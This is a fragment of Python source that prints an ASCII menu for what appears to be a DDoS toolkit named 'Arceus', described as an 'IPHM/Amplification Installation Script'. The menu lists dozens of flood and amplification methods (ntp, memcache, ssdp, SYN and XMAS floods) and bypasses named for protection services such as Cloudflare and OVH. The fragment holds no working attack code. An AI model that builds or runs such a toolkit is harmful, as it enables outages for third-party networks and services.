print(""+ pink +"║ "+ orange +"mssql "+ pink +"{"+ purple +"IPHM"+ pink +"}          ║║ "+ orange +"csyn "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"zap "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║║ "+ orange +"arme "+ pink +"{"+ purple +"IPHM"+ pink +"}        "+ pink +"║")
print(""+ pink +"║ "+ orange +"ts3 "+ pink +"{"+ purple +"IPHM"+ pink +"}            ║║ "+ orange +"xsyn "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"wizard "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"omega "+ pink +"{"+ purple +"IPHM"+ pink +"}       "+ pink +"║")
print(""+ pink +"║ "+ orange +"HUN-FUN "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"zsyn "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"bogus "+ pink +"{"+ purple +"IPHM"+ pink +"}       ║║ "+ orange +"tcp-psh "+ pink +"{"+ purple +"IPHM"+ pink +"}     "+ pink +"║")
print(""+ pink +"║ "+ orange +"ASS-CRK "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"issyn "+ pink +"{"+ purple +"IPHM"+ pink +"}       ║║ "+ orange +"rawudp "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"tcp-rst "+ pink +"{"+ purple +"IPHM"+ pink +"}     "+ pink +"║")
print(""+ pink +"║ "+ orange +"EFT-PWR "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"ovhbypass "+ pink +"{"+ purple +"IPHM"+ pink +"}   ║║ "+ orange +"udp_vse2 "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"tcp-fin "+ pink +"{"+ purple +"IPHM"+ pink +"}     "+ pink +"║")
print(""+ pink +"║ "+ orange +"PMP-PMP "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"cfbypass "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"udp_vse1 "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"tcp-xmas "+ pink +"{"+ purple +"IPHM"+ pink +"}    "+ pink +"║")
print(""+ pink +"║ "+ orange +"ZCH-CRI "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"nfobypass "+ pink +"{"+ purple +"IPHM"+ pink +"}   ║║ "+ orange +"grenade "+ pink +"{"+ purple +"IPHM"+ pink +"}     ║║ "+ orange +"tcp-ack "+ pink +"{"+ purple +"IPHM"+ pink +"}     "+ pink +"║")
print(""+ pink +"║ "+ purple +"Gang <3               "+ pink +"║║ "+ orange +"bo4bypass "+ pink +"{"+ purple +"IPHM"+ pink +"}   ║║ "+ orange +"zap "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║║ "+ orange +"ejunk "+ pink +"{"+ purple +"IPHM"+ pink +"}       "+ pink +"║")
print(""+ pink +"╚═══════════════════════╝╚════════════════════╝╚════════════════════╝╚════════════════════╝")
# Menu without colors 
# ╔═══════════════════════╗╔════════════════════╗╔════════════════════╗╔════════════════════╗
# ║ Downloaded all methods║║ vse {IPHM}         ║║ dns {IPHM}         ║║ Arceus I - Beta 10 ║
# ╠═══════════════════════╣║ telnet {IPHM}      ║║ snmp {IPHM}        ║║ IPHM/Amplification ║
# ║ ldap {IPHM}           ║║ tcpabuse {IPHM}    ║║ db2 {IPHM}         ║║ Installation Script║
# ║ ntp {IPHM}            ║║ udpabuse {IPHM}    ║║ echo {IPHM}        ║║   Developer: Cri   ║
# ║ tftp {IPHM            ║║ dominate {IPHM}    ║║ mdns {IPHM}        ║╚════════════════════╝
# ║ ssdp {IPHM            ║║ winsyn {IPHM}      ║║ memcache {IPHM}    ║╔════════════════════╗
# ║ portmap {IPHM}        ║║ winseqid {IPHM}    ║║ rip {IPHM}         ║║ WSD {IPHM}         ║
# ║ chargen {IPHM}        ║║ yubina {IPHM}      ║║ reaper {IPHM}      ║║ ARD {IPHM}         ║
# ║ sentinel {IPHM}       ║║ prowin {IPHM}      ║║ heartbeat {IPHM}   ║║ xanax {IPHM}       ║
# ║ netbios {IPHM}        ║║ essyn {IPHM}       ║║ grenade {IPHM}     ║║ frag {IPHM}        ║
# ║ mssql {IPHM}          ║║ csyn {IPHM}        ║║ zap {IPHM}         ║║ arme {IPHM}        ║
# ║ ts3 {IPHM}            ║║ xsyn {IPHM}        ║║ wizard {IPHM}      ║║ omega {IPHM}       ║
# ║ HUN-FUN {IPHM}        ║║ zsyn {IPHM}        ║║ bogus {IPHM}       ║║ tcp-psh {IPHM}     ║
# ║ ASS-CRK {IPHM}        ║║ issyn {IPHM}       ║║ rawudp {IPHM}      ║║ tcp-rst {IPHM}     ║
# ║ EFT-PWR {IPHM}        ║║ ovhbypass {IPHM}   ║║ udp_vse2 {IPHM}    ║║ tcp-fin {IPHM}     ║
# ║ PMP-PMP {IPHM}        ║║ cfbypass {IPHM}    ║║ udp_vse1 {IPHM}    ║║ tcp-xmas {IPHM}    ║
# ║ ZCH-CRI {IPHM}        ║║ nfobypass {IPHM}   ║║ grenade {IPHM}     ║║ tcp-ack {IPHM}     ║
# ║ Gang <3               ║║ bo4bypass {IPHM}   ║║ zap {IPHM}         ║║ ejunk {IPHM}       ║
# ╚═══════════════════════╝╚════════════════════╝╚════════════════════╝╚════════════════════╝